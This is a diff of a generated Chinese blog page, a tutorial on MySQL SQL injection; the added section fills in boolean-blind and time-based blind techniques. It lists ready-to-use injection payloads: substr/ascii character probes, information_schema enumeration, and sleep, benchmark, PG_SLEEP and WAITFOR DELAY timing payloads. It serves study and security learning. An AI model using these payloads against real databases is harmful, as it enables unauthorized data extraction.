@@ -15,7 +15,7 @@
 <meta property="og:url" content="https://ghcdgit.github.io/2018/02/19/mysql-常规注入/index.html">
 <meta property="og:site_name" content="GHC&#39;s Blog">
 <meta property="og:description" content="1. union 注入2. 报错注入3. 基于布尔盲注4. 基于时间盲注">
-<meta property="og:updated_time" content="2018-02-20T09:07:42.945Z">
+<meta property="og:updated_time" content="2018-02-21T02:44:09.190Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySQL 常规注入">
 <meta name="twitter:description" content="1. union 注入2. 报错注入3. 基于布尔盲注4. 基于时间盲注">
@@ -47,7 +47,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="" class="js-avatar">
+			<img src="img/touxiang.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">GHC</a></h1>
@@ -105,7 +105,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="" class="js-avatar">
+				<img src="img/touxiang.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">GHC</h1>
@@ -229,7 +229,57 @@
 <h4 id="2-10-exp"><a href="#2-10-exp" class="headerlink" title="2.10 exp()"></a>2.10 exp()</h4><blockquote>
 <p>select <em> from test where id=1 and exp(~(select </em> from(select user())a));</p>
 </blockquote>
-<h3 id="3-基于布尔盲注-1"><a href="#3-基于布尔盲注-1" class="headerlink" title="3. 基于布尔盲注"></a>3. 基于布尔盲注</h3><h3 id="4-基于时间盲注-1"><a href="#4-基于时间盲注-1" class="headerlink" title="4. 基于时间盲注"></a>4. 基于时间盲注</h3>
+<h3 id="3-基于布尔盲注-1"><a href="#3-基于布尔盲注-1" class="headerlink" title="3. 基于布尔盲注"></a>3. 基于布尔盲注</h3><p>常用函数</p>
+<p>​    <code>length(string)</code>   </p>
+<p>​    <code>substr(string,start,length)</code> </p>
+<p>​    <code>mid(string,start,length)</code></p>
+<p>​    <code>left(string,length)</code></p>
+<p>​    <code>ascii(char)</code></p>
+<p>​    <code>ord()</code>函数同<code>ascii()</code>，将字符转为ascii值 </p>
+<p>​    <code>regexp</code></p>
+<p>​    <code>like</code></p>
+<p>常用语句</p>
+<blockquote>
+<p>and length(database())=6 - - +</p>
+<p>and substr(database(),1,1)=’r’ - -+</p>
+<p>and ascii(substr(database(),1,1))=97 - -+</p>
+<p>and ascii(left(databse(),1))=97 - - +</p>
+<p>ans  substr((select table_name from information_schema. tables where table_schema=database() limit 1,1),2,1)&lt;’e’- - +</p>
+<p>select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)); </p>
+<p>select * from users where id=1 and 1=(user() regexp’^ri’);</p>
+<p>select user() like ‘ro%’</p>
+</blockquote>
+<h3 id="4-基于时间盲注-1"><a href="#4-基于时间盲注-1" class="headerlink" title="4. 基于时间盲注"></a>4. 基于时间盲注</h3><p>常用语句</p>
+<blockquote>
+<p>if((ascii(substr((select schemata_name from information_schema.schemata limit 0,1),1))&gt;0),sleep(3),1)</p>
+<p>判断编号为零的数据库的第一个字符的ascii值是否大于0，如果大于则延迟3秒刷新界面，否则不延迟</p>
+<p>if(判断条件，如果正确执行的语句，如果错误执行的语句)</p>
+<p>sleep(秒数)           延迟多少秒执行语句，可以为毫秒`</p>
+</blockquote>
+<p> BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式</p>
+<blockquote>
+<p>if((ascii(substr((select schemata_name from information_schema.schemata limit 0,1),1))&gt;0),benchmark(1000000,MD5(1)),1)</p>
+<p>union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tbl</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Mysql</th>
+<th style="text-align:left">BENCHMARK(100000,MD5(1))  or sleep(5)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Postgresql</td>
+<td style="text-align:left">PG_SLEEP(5)   OR GENERATE_SERIES(1,10000)</td>
+</tr>
+<tr>
+<td style="text-align:left">Ms sql server</td>
+<td style="text-align:left">WAITFOR DELAY ‘0:0:5’</td>
+</tr>
+</tbody>
+</table>
+
       
 
       
@@ -275,7 +325,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/MySQL//" class="article-tag-list-link color1">MySQL</a>
+        			<a href="/categories/mysql//" class="article-tag-list-link color1">mysql</a>
         		</li>
       		
 		</ul>
@@ -343,6 +393,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2018/02/21/mysql-基础/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          mysql 基础
+        
+      </div>
+    </a>
   
   
     <a href="/2018/02/15/blog/" id="article-nav-older" class="article-nav-link-wrap">
